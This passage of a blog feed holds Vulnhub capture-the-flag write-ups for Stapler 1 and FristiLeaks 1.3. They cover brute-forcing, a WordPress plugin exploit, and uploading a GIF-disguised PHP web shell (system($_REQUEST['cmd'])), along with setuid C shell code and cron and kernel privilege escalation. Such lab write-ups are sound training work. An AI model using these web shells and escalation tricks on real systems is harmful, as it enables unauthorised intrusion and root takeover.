        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setreuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;perror&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Setuid&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;perror&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Error executing command&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;privesc2root.png&quot; alt=&quot;Privesc2root&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;This is a really easy box and I didn’t have any trouble solving it, mainly because I knew all the tricks that were needed except for the LFI one.&lt;br /&gt;
As I said before, this is the last easy box in the list, so I don’t know if I’m going to keep solving the next boxes or if I’m going to do more specific challenges to learn more before trying them (probably binary exploitation or Windows).&lt;/p&gt;

</description>
        <pubDate>Tue, 07 Jul 2020 00:00:00 -0400</pubDate>
        <link>http://localhost:4000/write-ups/pwnlab_init_writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/write-ups/pwnlab_init_writeup/</guid>
        
        
        <category>write-ups</category>
        
      </item>
    
      <item>
        <title>Stapler 1 Write-Up</title>
        <description>&lt;p&gt;Stapler 1 is an easy OSCP-like boot to root VM hosted on Vulnhub. The goal in this challenge is to obtain root in the box and read the flag.&lt;br /&gt;
As stated in the Vulnhub page, there are 2 intended ways to obtain a limited shell and 3 intended ways to obtain root.&lt;/p&gt;
&lt;h1&gt;Network Scan&lt;/h1&gt;
&lt;p&gt;In this case, the machine doesn’t tell us its IP address, so I used Nmap to scan the network and find it.
&lt;img src=&quot;netScan.png&quot; alt=&quot;Network Scan Result&quot; /&gt;
I know that 192.168.56.1 is the gateway and 192.168.56.10 is the Kali machine, so 192.168.56.128 must be the target box.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Port Scan&lt;/h1&gt;
&lt;p&gt;The port scan reveals lots of open ports, including one which is unusally high. 
&lt;img src=&quot;allPortsScan.png&quot; alt=&quot;Port scan result&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;FTP Anonymous Login&lt;/h1&gt;
&lt;p&gt;Port 21 has a ftp server with anonymous access configured, as shown in the Nmap output.
&lt;img src=&quot;ftpNmap.png&quot; alt=&quot;FTP Nmap output&quot; /&gt;
Just from connecting we get a possible user (Harry) and using user = anonymous and any password we get anonymous access, with allows us to read a file with two possible usernames (Elly and John).
&lt;img src=&quot;ftpAnon1.png&quot; alt=&quot;FTP Anon 1&quot; /&gt;
&lt;img src=&quot;ftpAnon2.png&quot; alt=&quot;FTP Anon 2&quot; /&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;n&quot;&gt;Elly&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;make&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sure&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;you&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;update&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Leave&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;it&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;your&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FTP&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;account&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;once&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;your&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;are&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;John&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Reading other people write-ups I found that Elly uses the password ylle for her ftp account, but I used another method to get access.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;HTTP Port 80&lt;/h1&gt;
&lt;p&gt;Here there isn’t anything interesting, using gobuster we can find that it is serving a home directory but I didn’t find anything useful (it is the /home/www/ directory, which is world writable).
&lt;img src=&quot;root80.png&quot; alt=&quot;Root HTTP 80&quot; /&gt;
&lt;img src=&quot;gobuster80.png&quot; alt=&quot;Gobuster HTTP 80&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Samba Enumeration&lt;/h1&gt;
&lt;p&gt;Port 139 has a Samba server which allows Guest login. There isn’t anything interesting inside the shares, but using enum4linux we can enumerate the users.
&lt;img src=&quot;smbmap.png&quot; alt=&quot;SMBMap&quot; /&gt;
&lt;img src=&quot;enum4linux.png&quot; alt=&quot;enum4linux users&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Obtaining Credentials (Method 1)&lt;/h1&gt;
&lt;p&gt;At this point I got stucked because of the rabbit holes in the other ports (except 12380, but I will talk about this one in the second method). I tried using Hydra to bruteforce the ftp credentials, using the user list as input for both the user and the password.
&lt;img src=&quot;hydraFTP.png&quot; alt=&quot;Hydra ftp&quot; /&gt;
If we access the ftp server using these credentials we get into the /etc/ directory. I searched for sensible information inside the directory, but I only found the /etc/password file which contains all the users inside of the box.
I used the same method as before to bruteforce the credentials for the ssh, only to find out that SHayslett uses the same password as before for his user account.
&lt;img src=&quot;hydraSSH.png&quot; alt=&quot;Hydra ssh&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Method 2&lt;/h1&gt;
&lt;p&gt;At first glance port 12380 doesn’t have anything (except for another username), but if we inspect the responses using Burpsuite we can see that something is odd, the server always responds with a 400 Bad Request.
&lt;img src=&quot;root12380_1.png&quot; alt=&quot;Root HTTP 12380 1&quot; /&gt;
&lt;img src=&quot;comment12380_1.png&quot; alt=&quot;Comment with user&quot; /&gt;
&lt;img src=&quot;burpIntercept.png&quot; alt=&quot;Burp intercept&quot; /&gt;
Using Nikto we can see that the server wants to use HTTPS, that’s why we are getting a 400 response. Also, we can see that there is a robots.txt file with some disallowed entries.
&lt;img src=&quot;nikto.png&quot; alt=&quot;Nikto&quot; /&gt;
The /admin112233 is a troll page, while the /blogblog has a Wordpress blog.
&lt;img src=&quot;blogblog.png&quot; alt=&quot;blogblog page&quot; /&gt;
I used wpscan but it couldn’t find anything, so I enumerated it manually.&lt;br /&gt;
The wp-contents/plugins/ has directory listing enabled, so we can enumerate the plugins. Using searchsploit we can see that one of the plugins was vulnerable in its 1.0 version (I couldn’t find the version of the installed plugin, but it seems to be 1.0).
&lt;img src=&quot;wpplugins.png&quot; alt=&quot;Wordpress plugins&quot; /&gt;
&lt;img src=&quot;searchsploitPlugin.png&quot; alt=&quot;Searchsploit plugin&quot; /&gt;
The searchsploit code didn’t work correctly, but searching in Google I found a &lt;a href=&quot;https://raw.githubusercontent.com/gtech/39646/master/39646.py&quot;&gt;more stable version&lt;/a&gt; which was created for this box.
&lt;img src=&quot;mysqlCreds.png&quot; alt=&quot;Exploit&quot; /&gt;
In the output we can see the credentials for the root user of mysql. In the Nikto output we can see that there is a phpmyadmin page, so I used the newly obtained credentials and enumerated the database (which contained interesting information, but nothing useful).&lt;br /&gt;
I used some SQL tricks to place a simple php shell inside the /wp-content/uploads/ directory and get RCE. (Ignore the typo in the screenshot).
&lt;img src=&quot;rce1.png&quot; alt=&quot;RCE 1&quot; /&gt;
&lt;img src=&quot;rce2.png&quot; alt=&quot;RCE 2&quot; /&gt;
&lt;img src=&quot;rce3.png&quot; alt=&quot;RCE 3&quot; /&gt;
&lt;img src=&quot;rce4.png&quot; alt=&quot;RCE 4&quot; /&gt;
At this point we can use a reverse shell to get shell access to the box, but I only used the first method because I prefer to have a more stable shell.&lt;br /&gt;
Also, Zoe uses the same password as the root database user in the box, so we can get SSH access from there.
&lt;img src=&quot;hydraSSH2.png&quot; alt=&quot;Hydra ssh 2&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;PrivEsc Method 1 (.bash_history)&lt;/h1&gt;
&lt;p&gt;Reading the LinEnum output we can see all the contents of the .bash_history of all users. JKanode has two passwords there.
&lt;img src=&quot;bashhist.png&quot; alt=&quot;Bash history&quot; /&gt;
Peter can run sudo as root.
&lt;img src=&quot;sudo1.png&quot; alt=&quot;Sudo 1&quot; /&gt;
&lt;img src=&quot;sudo2.png&quot; alt=&quot;Sudo 2&quot; /&gt;
And from here we can read the flag inside the /root/flag.txt file.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;PrivEsc Method 2 (cronjob)&lt;/h1&gt;
&lt;p&gt;Reading the cron jobs we can see that root runs the /usr/local/sbin/cron-logrotate.sh script every 5 minutes and everyone has permission to write to this file.
&lt;img src=&quot;cronjob.png&quot; alt=&quot;Cronjob&quot; /&gt;
This can also be found using the find command.
&lt;img src=&quot;findWrite.png&quot; alt=&quot;Find writable&quot; /&gt;
We can just grant sudo privileges to the user that we are using (zoe in my case).
&lt;img src=&quot;cronModified.png&quot; alt=&quot;Cron modified&quot; /&gt;
&lt;img src=&quot;zoeSudo.png&quot; alt=&quot;Zoe sudo&quot; /&gt;
Just remember to remove the command from the cron-logrotate to avoid problems with the /etc/sudoers file.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;PrivEsc Method 3 (Kernel exploit)&lt;/h1&gt;
&lt;p&gt;Again, reading the LinEnum output we can see the kernel version and the Ubuntu version. Using searchsploit we can see lots of exploits for this version, but most of them are for 64 bits operating systems and the one in the machine uses 32 bits.&lt;br /&gt;
The exploit was a bit weird and I had to execute it two times before I got root.
&lt;img src=&quot;kern1.png&quot; alt=&quot;Kern exploit 1&quot; /&gt;
&lt;img src=&quot;kern2.png&quot; alt=&quot;Kern exploit 2&quot; /&gt;
&lt;img src=&quot;kern3.png&quot; alt=&quot;Kern exploit 3&quot; /&gt;
&lt;img src=&quot;kern4.png&quot; alt=&quot;Kern exploit 4&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;This box has a lot of rabbit holes and can be pretty confusing if you don’t take notes.&lt;br /&gt;
I’ve learnt how to enumerate Samba shares and use enum4linux, as well as reminding myself to read more carefully the LinEnum output and search for writable files.&lt;/p&gt;
</description>
        <pubDate>Thu, 02 Jul 2020 00:00:00 -0400</pubDate>
        <link>http://localhost:4000/write-ups/stapler_1_writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/write-ups/stapler_1_writeup/</guid>
        
        
        <category>write-ups</category>
        
      </item>
    
      <item>
        <title>FristiLeaks 1.3 Write-Up</title>
        <description>&lt;p&gt;FristiLeaks is an easy OSCP-like boot to root VM hosted on Vulnhub. The goal in this challenge is to obtain root in the box and read the flag.&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Port Scan&lt;/h1&gt;
&lt;p&gt;Normally, the first thing to do when dealing with Vulnhub machines is to scan the network (I use Nmap to do so) to find the IP of the vulnerable machine, 
but in this case the machine tells us its IP in the login prompt. 
&lt;img src=&quot;allPortsScan.png&quot; alt=&quot;Port scan result&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the scan we can see that the only open port is 80, which usually is HTTP.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Port 80 Initial Enumeration&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;port80Nmap.png&quot; alt=&quot;Nmap output for port 80&quot; /&gt;
In the Nmap output for port 80 using the default scripts we can see that robots.txt has three disallowed entries. Also, we can see that the webserver uses 
Apache httpd 2.2.15, PHP version 5.3.3 and the distribution is CentOS.
&lt;br /&gt;&lt;br /&gt;
The root page of the web has nothing interesting at first glance, but there is this image which will be useful later.
&lt;img src=&quot;KeepCalm.png&quot; alt=&quot;KeepCalm&quot; /&gt;
Also, inside of the robots.txt file we can see the three disallowed entries.
&lt;img src=&quot;robots.png&quot; alt=&quot;Robots file&quot; /&gt;
All the disallowed entries have the same image saying “This is not the URL you were looking for” (I didn’t get a screenshot of this). 
At this point I wasn’t sure about what to do, as I didn’t find any interesting vulnerabilities for the server and neither did both Nikto and gobuster.
&lt;br /&gt;
Using a bit of guess work I found the directory fristi. All the entries in the robots.txt are drinks and, according to the image, fristi is also a drink. Maybe using a 
wordlist generated by CEWL and gobuster you can find the directory, but I didn’t think about this when I was enumerating the box.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Fristi Directory&lt;/h1&gt;
&lt;p&gt;The index.php file of this directory is a login page which isn’t vulnerable to SQLInjection (or at least I couldn’t find it), but I found two different ways to
“bypass” it.&lt;br /&gt;&lt;/p&gt;
&lt;h2&gt;First Method&lt;/h2&gt;
&lt;p&gt;In the source code we can see some interesting comments.
&lt;img src=&quot;fristiCom0.png&quot; alt=&quot;First commentary&quot; /&gt; 
&lt;img src=&quot;fristiCom1.png&quot; alt=&quot;Second commentary&quot; /&gt;
&lt;img src=&quot;fristiCom2.png&quot; alt=&quot;Third commentary&quot; /&gt;
We get a possible username (eezeepz) inside of the first commentary and a base64 encoded image. If we decode it we can see that it is a PNG image.
&lt;img src=&quot;decodeFristiImg.png&quot; alt=&quot;Decoding&quot; /&gt;
&lt;img src=&quot;decodedFristiImg.png&quot; alt=&quot;Decoded&quot; /&gt;
Here we can guess that the user “eezeepz” has the password “keKkeKKeKKeKkEkkEk”. A successful login redirects us to the “upload.php” page.
&lt;br /&gt;&lt;/p&gt;
&lt;h2&gt;Second Method&lt;/h2&gt;
&lt;p&gt;Using gobuster with the .php extension we can find the “uploads” directory, which hasn’t directory listing activated and “upload.php”, which redirects us to the login page.
&lt;br /&gt;
Intercepting the request to “upload.php” using BurpSuite we can see that there is more content below the redirection. If we rewrite the status code (302 FOUND) to 200 OK, we can see the upload page without knowing the credentials.
&lt;img src=&quot;burpIntercept.png&quot; alt=&quot;BurpSuite request interception&quot; /&gt; 
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;File Upload + RCE&lt;/h1&gt;
&lt;p&gt;The page only allows uploading images, but it can be bypassed easily. You just need to change the &lt;a href=&quot;https://en.wikipedia.org/wiki/List_of_file_signatures&quot;&gt;magic bytes&lt;/a&gt; to something that will be detected as an image, as well as using the correct extension.
&lt;br /&gt;
I didn’t try using the correct extension without changing the magic bytes, but it probably doesn’t work. In my case, I used GIF87a as the magic bytes and created a really simple php shell to test if the RCE was possible.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;GIF87a
#The echo is redundant, as system prints the output of the command executed.
&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;uploadShell.png&quot; alt=&quot;Uploading of the shell&quot; /&gt;
&lt;img src=&quot;correctUpload.png&quot; alt=&quot;Correct upload&quot; /&gt;
This shell works pretty well, but it can’t execute commands that need arguments (strangely, it works fine in my machine, hosting the shell using php -S localhost:8000).
&lt;br /&gt;
To use it you just need to pass the command inside the cmd argument, it accepts both GET and POST requests. In my case, I executed the whoami command.
&lt;img src=&quot;simpleRCE.png&quot; alt=&quot;Code execution&quot; /&gt;
After I checked that the simple shell really worked, I uploaded a php reverse shell (the one inside /usr/share/webshells/php/php-reverse-shell.php on Kali) and set a listener on port 1234.
&lt;img src=&quot;revShell.png&quot; alt=&quot;Reverse shell&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Apache Shell&lt;/h1&gt;
&lt;p&gt;The first thing I did was upgrading the shell to a &lt;a href=&quot;https://null-byte.wonderhowto.com/how-to/upgrade-dumb-shell-fully-interactive-shell-for-more-flexibility-0197224/&quot;&gt;more functional one&lt;/a&gt;.
&lt;img src=&quot;upgradingShell.png&quot; alt=&quot;Shell upgrade&quot; /&gt;
Inside the “checklogin.php” file we can get the hardcoded mysql credentials, but we can only read the username and the password required to access the “upload.php” page.
&lt;img src=&quot;mysqlCreds.png&quot; alt=&quot;Creds&quot; /&gt;
Inside the file located at “/var/www/notes.txt” there is an interesting message.
&lt;img src=&quot;notes1.png&quot; alt=&quot;Notes.txt 1&quot; /&gt;
If we go to the “/home/eezeepz” directory we can see lots of uninteresting files and another notes.txt.
&lt;img src=&quot;notes2.png&quot; alt=&quot;Notes.txt 2&quot; /&gt;
Essentially this is saying that we can run commands as another user. I found two ways to exploit this, but I only used the easiest as the other one was too time consuming.&lt;/p&gt;
&lt;h2&gt;First Method (not used)&lt;/h2&gt;
&lt;p&gt;Looking inside the “/usr/bin/” directory we can see the gcc binary, so I created a pretty simple C shell that uses the “setuid()” system call to run as another user.&lt;br /&gt;
My idea is to upload the file to the box (using the http.server module in python3 to serve the file), make the other user compile the shell and setting the SetUID bit, as well as giving execute permissions to others.&lt;br /&gt;
The shell that I used was really simple for the sake of saving time, but I could have used a more interactive shell if it was necessary.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Usage: ./shell &amp;lt;command&amp;gt; &amp;lt;uid&amp;gt;  (no arguments for the command)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;atoi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;perror&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Setuid&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;perror&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Error executing command&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Inside the “/tmp/runthis” file I wrote the necessary commands to do this and I read the uid from the “/etc/passwd” file, which I’m not including because it’s too large.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;/usr/bin/gcc /tmp/shell.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /tmp/shell
/home/admin/chmod u+s /tmp/shell
/home/admin/chmod o+x /tmp/shell&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;shellPermission.png&quot; alt=&quot;Shell permissions&quot; /&gt;
&lt;img src=&quot;shellExecution.png&quot; alt=&quot;Execution&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h2&gt;Second Method + PrivEsc&lt;/h2&gt;
&lt;p&gt;We can read the “/home/admin/” directory if we change the permissions using the “/tmp/runit” file and the chmod command.&lt;br /&gt;
Inside this directory there are two seemingly encrypted files (cryptedpass.txt and whoisyourgodnow.txt) and a python script which encrypts them (I didn’t take a screenshot of this, I don’t know why).
&lt;br /&gt;
The python script only base64 encodes the supplied password, then it reverses it and finally it encrypts it using the ROT13 method. If we reverse these steps, we can read the plaintext password.
&lt;img src=&quot;cryptedPass.png&quot; alt=&quot;Crypted pass&quot; /&gt;
&lt;img src=&quot;whogodPass.png&quot; alt=&quot;Whogod pass&quot; /&gt;
The first picture has the unencrypted text inside of “cyptedpass.txt”, while the second has the text inside “whoisyourgodnow.txt”.&lt;br /&gt;
LetThereBeFristi! (inside whoisyourgodnow.txt) is the password for the fristigod user.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Root PrivEsc&lt;/h1&gt;
&lt;p&gt;Executing the “sudo -l” command as user fristigod and supplying the “LetThereBeFristi!” password outputs this:
&lt;img src=&quot;sudoL.png&quot; alt=&quot;sudo -l output&quot; /&gt;
And if we check the “/var/fristigod/.secret_admin_stuff/” we can see that the doCom binary has the SetUid bit and is owned by root.
&lt;img src=&quot;ls_fristigod.png&quot; alt=&quot;ls /var/fristigod/.secret_admin_stuff/&quot; /&gt;
Using the “sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom” command we can check the usage of this binary, which allows us to run commands as root.
&lt;br /&gt;
Running the “/bin/bash” command grants us an interactive shell as root and then we can read the flag inside “/root/fristileaks_secrets.txt”.
&lt;img src=&quot;rootPrivEsc.png&quot; alt=&quot;Root privesc&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Conclusion&lt;/h1&gt;
